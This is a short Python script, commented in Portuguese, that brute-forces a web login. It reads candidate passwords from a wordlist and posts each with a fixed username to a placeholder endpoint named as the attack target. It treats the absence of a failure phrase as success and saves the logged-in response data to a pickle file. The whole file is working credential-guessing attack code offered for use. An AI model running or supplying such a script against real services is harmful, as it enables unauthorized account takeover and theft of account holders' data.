import requests
import pickle

url = "url base"
endpoint_login = url + "endpoint para ataque"
wordlistPass = "password.txt"
usuario = "usuario qualquer"
fileWithDataCaptured = "data.json"
fraseCondicional = (
    "caso não lembre por favor entrar"
)

readDataNow = False


def lerDados(file):
    with open(file, "rb") as openData:
        data = pickle.load(openData)
    print(data)
    print(type(data))


def request(user, password):
    data = {
        "username": user,
        "password": password,
    }
    
    r = requests.post(endpoint_login, json=data)

    if fraseCondicional in r.text:
        print("Não foi possivel logar")
    else:
        print("logado com sucesso")
        with open(fileWithDataCaptured, "wb") as fp:
            pickle.dump(r.json(), fp)

def run():
    with open(wordlistPass, "r") as wordlist:
        for psswd in wordlist:
            print("Testando usuário: " + usuario + " senha: " + psswd)
            request(usuario, psswd)
            print("===================================\n")

try:
    run()
except FileNotFoundError:
    print("file not found: " + wordlistPass)
finally:
    try:
        if readDataNow:
             lerDados(fileWithDataCaptured)
        exit()
    except FileNotFoundError:
        print("file not found: " + fileWithDataCaptured)
        exit()

